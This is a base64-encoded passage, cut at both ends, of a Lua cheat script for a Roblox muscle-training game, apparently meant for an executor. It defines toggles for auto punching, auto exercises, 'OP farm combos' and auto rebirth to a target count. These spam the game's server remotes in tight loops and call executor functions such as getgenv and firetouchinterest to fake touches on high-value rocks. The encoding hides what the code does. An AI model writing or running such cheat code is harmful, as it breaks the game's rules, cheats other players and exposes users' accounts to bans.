dW5jdGlvbihzdGF0ZSkKICAgICAgICBfRy5mYXN0UHVuY2ggPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgYXV0b0Zhc3RQdW5jaCgpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEF1dG8gUHVuY2gKbG9jYWwgZnVuY3Rpb24gYXV0b1B1bmNoKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgcGxheWVyTmFtZSA9IHBsYXllci5OYW1lCiAgICBfRy5wdW5jaGFuaW0gPSB0cnVlCgogICAgZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKSAgCiAgICAgICAgaWYgX0cucHVuY2hhbmltIHRoZW4gIAogICAgICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSAgCiAgICAgICAgICAgICAgICBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgb3IgIAogICAgICAgICAgICAgICAgZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQocGxheWVyTmFtZSkgYW5kIGdhbWUuV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKHBsYXllck5hbWUpOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpICAKCiAgICAgICAgICAgIGlmIHB1bmNoVG9vbCB0aGVuICAKICAgICAgICAgICAgICAgIGlmIHB1bmNoVG9vbC5QYXJlbnQgfj0gZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQocGxheWVyTmFtZSkgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgcHVuY2hUb29sLlBhcmVudCA9IGdhbWUuV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKHBsYXllck5hbWUpCiAgICAgICAgICAgICAgICBlbmQgIAogICAgICAgICAgICAgICAgcHVuY2hUb29sOkFjdGl2YXRlKCkKICAgICAgICAgICAgZWxzZSAgCiAgICAgICAgICAgICAgICB3YXJuKCJQdW5jaCB0b29sIG5vdCBmb3VuZCIpICAKICAgICAgICAgICAgICAgIF9HLnB1bmNoYW5pbSA9IGZhbHNlCiAgICAgICAgICAgIGVuZCAgCiAgICAgICAgZW5kICAKICAgIGVuZCkKZW5kCgpBdXRvRmFybTpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBQdW5jaCIsCiAgICBEZXNjID0gIkF1dG9tYXRpYyBwdW5jaCB0b29sIGFjdGl2YXRpb24iLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgX0cucHVuY2hhbmltID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIGF1dG9QdW5jaCgpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEluZGl2aWR1YWwgRXhlcmNpc2UgVG9nZ2xlcwpsb2NhbCBmdW5jdGlvbiBhdXRvTXVzY2xlKGFjdGlvbikKICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICB3aGlsZSBfR1thY3Rpb25dIGRvCiAgICAgICAgbG9jYWwgdG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZChhY3Rpb24pIAogICAgICAgIGlmIHRvb2wgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgdG9vbDpBY3RpdmF0ZSgpCiAgICAgICAgZW5kCiAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIsIGFjdGlvbikKICAgICAgICB0YXNrLndhaXQoKQogICAgZW5kCgogICAgaWYgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChhY3Rpb24pIHRoZW4KICAgICAgICBwbGF5ZXIuQ2hhcmFjdGVyW2FjdGlvbl0uUGFyZW50ID0gcGxheWVyLkJhY2twYWNrCiAgICBlbmQKZW5kCgpBdXRvRmFybTpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBXZWlnaHQiLAogICAgRGVzYyA9ICJBdXRvbWF0aWMgd2VpZ2h0IHRyYWluaW5nIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIF9HWyJXZWlnaHQiXSA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbiAKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpIGF1dG9NdXNjbGUoIldlaWdodCIpIGVuZCkgCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFB1c2h1cHMiLAogICAgRGVzYyA9ICJBdXRvbWF0aWMgcHVzaHVwcyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBfR1siUHVzaHVwcyJdID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIAogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkgYXV0b011c2NsZSgiUHVzaHVwcyIpIGVuZCkgCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIEhhbmRzdGFuZHMiLAogICAgRGVzYyA9ICJBdXRvbWF0aWMgaGFuZHN0YW5kcyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBfR1siSGFuZHN0YW5kcyJdID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIAogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkgYXV0b011c2NsZSgiSGFuZHN0YW5kcyIpIGVuZCkgCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFNpdHVwcyIsCiAgICBEZXNjID0gIkF1dG9tYXRpYyBzaXR1cHMiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgX0dbIlNpdHVwcyJdID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIAogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkgYXV0b011c2NsZSgiU2l0dXBzIikgZW5kKSAKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gT1AgRmFybSBDb21ib3MgU2VjdGlvbgpBdXRvRmFybTpTZWN0aW9uKHtUaXRsZSA9ICJPUCBGQVJNIENPTUJPUyJ9KQoKLS0gUHVzaHVwcyArIEp1bmdsZSBSb2NrIENvbWJvCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJQdXNodXBzICsgSnVuZ2xlIFJvY2siLAogICAgRGVzYyA9ICJBdXRvIFB1c2h1cHMsIEp1bmdsZSBSb2NrICYgQXV0byBQdW5jaCIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBnZXRnZW52KCkuYXV0b0Zhcm0gPSBzdGF0ZQogICAgICAgIF9HLkF1dG9QdXNodXBzID0gc3RhdGUKICAgICAgICBhdXRvUHVuY2hOb0FuaW0gPSBzdGF0ZQogICAgICAgIHNlbGVjdHJvY2sgPSAiQW5jaWVudCBKdW5nbGUgUm9jayIKCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgaWYgX0cuQXV0b1B1c2h1cHMgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1c2h1cHNUb29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdXNodXBzIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdXNodXBzIikKICAgICAgICAgICAgICAgICAgICBpZiBwdXNodXBzVG9vbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2wocHVzaHVwc1Rvb2wpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIikKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBhdXRvUHVuY2hOb0FuaW0gdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wuUGFyZW50IH49IGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdW5jaFRvb2wuUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJsZWZ0SGFuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHdhcm4oIlB1bmNoIHRvb2wgbm90IGZvdW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiRHVyYWJpbGl0eSIpIGFuZCBwbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSA+PSAxMDAwMDAwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoZ2FtZS5Xb3Jrc3BhY2UubWFjaGluZXNGb2xkZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxMDAwMDAwMCBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2V0dG9vbCB0aGVuIHBjYWxsKGdldHRvb2wpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCi0tIFNpdHVwcyArIEp1bmdsZSBSb2NrIENvbWJvCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJTaXR1cHMgKyBKdW5nbGUgUm9jayIsCiAgICBEZXNjID0gIkF1dG8gU2l0dXBzLCBKdW5nbGUgUm9jayAmIEF1dG8gUHVuY2giLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gc3RhdGUKICAgICAgICBfRy5BdXRvU2l0dXBzID0gc3RhdGUKICAgICAgICBhdXRvUHVuY2hOb0FuaW0gPSBzdGF0ZQogICAgICAgIHNlbGVjdHJvY2sgPSAiQW5jaWVudCBKdW5nbGUgUm9jayIKCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgaWYgX0cuQXV0b1NpdHVwcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc2l0dXBzVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiU2l0dXBzIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJTaXR1cHMiKQogICAgICAgICAgICAgICAgICAgIGlmIHNpdHVwc1Rvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKHNpdHVwc1Rvb2wpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIikKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBhdXRvUHVuY2hOb0FuaW0gdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wuUGFyZW50IH49IGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdW5jaFRvb2wuUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJsZWZ0SGFuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHdhcm4oIlB1bmNoIHRvb2wgbm90IGZvdW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiRHVyYWJpbGl0eSIpIGFuZCBwbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSA+PSAxMDAwMDAwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoZ2FtZS5Xb3Jrc3BhY2UubWFjaGluZXNGb2xkZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxMDAwMDAwMCBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2V0dG9vbCB0aGVuIHBjYWxsKGdldHRvb2wpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCi0tIEhhbmRzdGFuZHMgKyBKdW5nbGUgUm9jayBDb21ibwpBdXRvRmFybTpUb2dnbGUoewogICAgVGl0bGUgPSAiSGFuZHN0YW5kcyArIEp1bmdsZSBSb2NrIiwKICAgIERlc2MgPSAiQXV0byBIYW5kc3RhbmRzLCBKdW5nbGUgUm9jayAmIEF1dG8gUHVuY2giLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gc3RhdGUKICAgICAgICBfRy5BdXRvSGFuZHN0YW5kcyA9IHN0YXRlCiAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gc3RhdGUKICAgICAgICBzZWxlY3Ryb2NrID0gIkFuY2llbnQgSnVuZ2xlIFJvY2siCgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b0Zhcm0gZG8KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAxKQogICAgICAgICAgICAgICAgaWYgbm90IGdldGdlbnYoKS5hdXRvRmFybSB0aGVuIGJyZWFrIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgaWYgbm90IGNoYXJhY3RlciB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgIGlmIF9HLkF1dG9IYW5kc3RhbmRzIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBoYW5kc3RhbmRzVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiSGFuZHN0YW5kcyIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGFuZHN0YW5kcyIpCiAgICAgICAgICAgICAgICAgICAgaWYgaGFuZHN0YW5kc1Rvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKGhhbmRzdGFuZHNUb29sKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgYXV0b1B1bmNoTm9BbmltIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2hUb29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2hUb29sLlBhcmVudCB+PSBjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2hUb29sLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgInJpZ2h0SGFuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAibGVmdEhhbmQiKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB3YXJuKCJQdW5jaCB0b29sIG5vdCBmb3VuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGF1dG9QdW5jaE5vQW5pbSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkR1cmFiaWxpdHkiKSBhbmQgcGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gMTAwMDAwMDAgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKGdhbWUuV29ya3NwYWNlLm1hY2hpbmVzRm9sZGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gMTAwMDAwMDAgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLlJpZ2h0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5MZWZ0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdldHRvb2wgdGhlbiBwY2FsbChnZXR0b29sKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCn0pICAgICAgICAKICAgICAgICAKLS0gUmViaXJ0aCBUYWIKbG9jYWwgUmViaXJ0aFRhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIlJlYmlydGgiLCBJY29uID0gInJvdGF0ZS1jdyJ9KQoKLS0gVGFyZ2V0IFJlYmlydGggU2VjdGlvbgpSZWJpcnRoVGFiOlNlY3Rpb24oe1RpdGxlID0gIlRhcmdldCBSZWJpcnRoIn0pCgotLSA9PT09PSBUQVJHRVQgUkVCSVJUSCBTWVNURU0gPT09PT0KbG9jYWwgdGFyZ2V0UmViaXJ0aCA9IDAKbG9jYWwgYXV0b1JlYmlydGhBY3RpdmUgPSBmYWxzZQoKUmViaXJ0aFRhYjpUZXh0Ym94KHsKICAgIFRpdGxlID0gIlR5cGUgVGFyZ2V0IFJlYmlydGggaGVyZSIsCiAgICBQbGFjZWhvbGRlciA9ICJFeGFtcGxlOiAxNTAwIiwKICAgIENsZWFyVGV4dE9uRm9jdXMgPSB0cnVlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihpbnB1dCkKICAgICAgICBsb2NhbCB0YXJnZXQgPSB0b251bWJlcihpbnB1dCkKICAgICAgICBpZiB0YXJnZXQgYW5kIHRhcmdldCA+IDAgdGhlbgogICAgICAgICAgICB0YXJnZXRSZWJpcnRoID0gdGFyZ2V0CiAgICAgICAgICAgIHByaW50KCJbU3lzdGVtXSBUYXJnZXQgUmViaXJ0aCBzZXQgdG86IiwgdGFyZ2V0UmViaXJ0aCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIHdhcm4oIltTeXN0ZW1dIEludmFsaWQgbnVtYmVyISBVc2UgZm9ybWF0OiAxNTAwIikKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgZnVuY3Rpb24gYXV0b1JlYmlydGgoKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIHJlYmlydGhzID0gcGxheWVyLmxlYWRlcnN0YXRzLlJlYmlydGhzCiAgICBsb2NhbCByZWJpcnRoUmVtb3RlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMucmViaXJ0aFJlbW90ZQogICAgCiAgICB3aGlsZSBhdXRvUmViaXJ0aEFjdGl2ZSBhbmQgcmViaXJ0aHMuVmFsdWUgPCB0YXJnZXRSZWJpcnRoIGRvCiAgICAgICAgcmViaXJ0aFJlbW90ZTpJbnZva2VTZXJ2ZXIoInJlYmlydGhSZXF1ZXN0IikKICAgICAgICB0YXNrLndhaXQoMC4wNSkKCiAgICAgICAgaWYgcmViaXJ0aHMuVmFsdWUgPj0gdGFyZ2V0UmViaXJ0aCB0aGVuCiAgICAgICAgICAgIGF1dG9SZWJpcnRoQWN0aXZlID0gZmFsc2UKICAgICAgICAgICAgcHJpbnQoIltTeXN0ZW1dIFN1Y2Nlc3MhIFJlYWNoZWQgdGFyZ2V0OiIsIHRhcmdldFJlYmlydGgpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpSZWJpcnRoVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFJlYmlydGggVG8gVGFyZ2V0IiwKICAgIENhbGxiYWN